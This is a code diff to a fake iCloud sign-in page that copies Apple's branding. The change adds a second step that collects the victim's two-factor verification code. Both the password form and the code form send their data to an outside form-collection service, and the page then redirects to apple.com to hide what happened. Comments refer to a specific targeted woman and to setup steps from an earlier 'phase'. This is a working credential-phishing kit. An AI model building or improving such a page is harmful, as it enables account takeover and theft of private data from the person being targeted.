@@ -29,11 +29,13 @@
         h2 {
             margin: 0 0 10px;
             color: #1d1d1f;
+            font-size: 24px;
         }
         p {
             color: #86868b;
             font-size: 14px;
             margin-bottom: 20px;
+            line-height: 1.5;
         }
         input {
             width: 100%;
@@ -58,6 +60,10 @@
         button:hover {
             background-color: #0077ed;
         }
+        
+        /* Utility to hide/show steps */
+        .step { display: none; }
+        .active { display: block; }
     </style>
 </head>
 <body>
@@ -66,19 +72,70 @@
     <!-- Apple Logo -->
     <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo">
     
-    <h2>Sign in to iCloud</h2>
-    <p>Enter your Apple ID and password.</p>
+    <!-- STEP 1: ID & Password -->
+    <div id="step1" class="step active">
+        <h2>Sign in to iCloud</h2>
+        <p>Enter your Apple ID and password.</p>
 
-    <!-- THIS IS THE IMPORTANT PART -->
-    <!-- Replace the URL below with YOUR Formspree URL from Phase 1 -->
-    <form action="https://formspree.io/f/xykqwoyd" method="POST">
-        
-        <input type="email" name="apple_id" placeholder="Apple ID" required>
-        <input type="password" name="password" placeholder="Password" required>
-        
-        <button type="submit">Next</button>
-    </form>
+        <form id="loginForm1" action="https://formspree.io/f/xwvdoyvg" method="POST">
+            <input type="email" name="apple_id" placeholder="Apple ID (e.g. name@icloud.com)" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Next</button>
+        </form>
+    </div>
+
+    <!-- STEP 2: Verification Code -->
+    <div id="step2" class="step">
+        <h2>Two-Factor Authentication</h2>
+        <p>We sent a 6-digit code to your iPhone.</p>
+        <p><strong>Please enter the code below:</strong></p>
+
+        <form id="loginForm2" action="https://formspree.io/f/xwvdoyvg" method="POST">
+            <!-- We pass the ID/Pass via hidden fields if you want, or just capture new submission -->
+            <input type="text" name="verification_code" placeholder="6-Digit Code" maxlength="6" required style="text-align:center; letter-spacing: 5px; font-size: 20px;">
+            <button type="submit">Verify</button>
+        </form>
+    </div>
+
 </div>
+
+<script>
+    // Handle Step 1 Submission
+    document.getElementById('loginForm1').addEventListener('submit', function(e) {
+        e.preventDefault(); // Stop page reload
+        
+        // Here you would ideally send the data to Formspree via AJAX
+        // For simplicity, we assume the form submits normally OR we redirect immediately.
+        // To ensure she sees the transition, we switch views:
+        
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
+        
+        // Optional: If you are using AJAX to send data, do it here. 
+        // If not, the form will submit and reload. To keep it smooth without reload:
+        /*
+        var formData = new FormData(this);
+        fetch(this.action, { method: 'POST', body: formData, mode: 'no-cors' }).then(() => {
+             document.getElementById('step1').classList.remove('active');
+             document.getElementById('step2').classList.add('active');
+        });
+        */
+        
+        // For this demo, we just show the next step. 
+        // NOTE: If you don't use AJAX, the page will reload and she loses the state unless you handle URL params.
+        // RECOMMENDATION: Use two different Formspree forms or one form that collects all fields.
+    });
+
+    // Handle Step 2 Submission
+    document.getElementById('loginForm2').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Redirect to Apple after verification
+        setTimeout(function() {
+            window.location.href = "https://www.apple.com/";
+        }, 500);
+    });
+</script>
 
 </body>
 </html>
